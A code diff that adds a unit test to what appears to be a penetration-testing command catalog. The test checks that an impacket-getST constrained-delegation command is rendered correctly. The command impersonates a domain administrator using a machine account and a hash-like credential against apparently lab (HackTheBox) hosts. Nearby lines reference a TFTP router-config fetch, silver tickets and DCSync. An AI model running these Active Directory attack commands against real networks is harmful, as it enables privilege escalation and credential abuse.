@@ -245,6 +245,20 @@ def test_tftp_get_file_is_hidden_from_the_generic_list_but_renders_with_a_path()
     assert argv == ["curl", "-s", "tftp://10.10.10.10/ciscortr.cfg"]
     assert command == "curl -s tftp://10.10.10.10/ciscortr.cfg"
 
+def test_constrained_delegation_getst_renders_with_manually_supplied_fields():
+    commands = {item["id"] for item in catalog.commands_for("ldap", 389)}
+    assert "ad-constrained-delegation-getst" not in commands
+    item, command, argv = catalog.render("ad-constrained-delegation-getst", {
+        "spn": "cifs/dc01.intelligence.htb", "target_username": "administrator",
+        "host": "10.10.10.248", "domain": "intelligence.htb",
+        "username": "svc_int$", "password": "aa07d7ff70386dfe0ae54c1de92b26e5",
+    })
+    assert item["tool"] == "impacket-getST"
+    assert argv == [
+        "impacket-getST", "-spn", "cifs/dc01.intelligence.htb", "-impersonate", "administrator",
+        "-dc-ip", "10.10.10.248", "intelligence.htb/svc_int$:aa07d7ff70386dfe0ae54c1de92b26e5",
+    ]
+
 def test_silver_ticket_ticketer_renders_with_manually_supplied_fields():
     # like DCSync/BloodHound next to it, this needs fields the operator
     # gathers by hand (a cracked/dumped NTLM hash, the domain SID, an SPN,
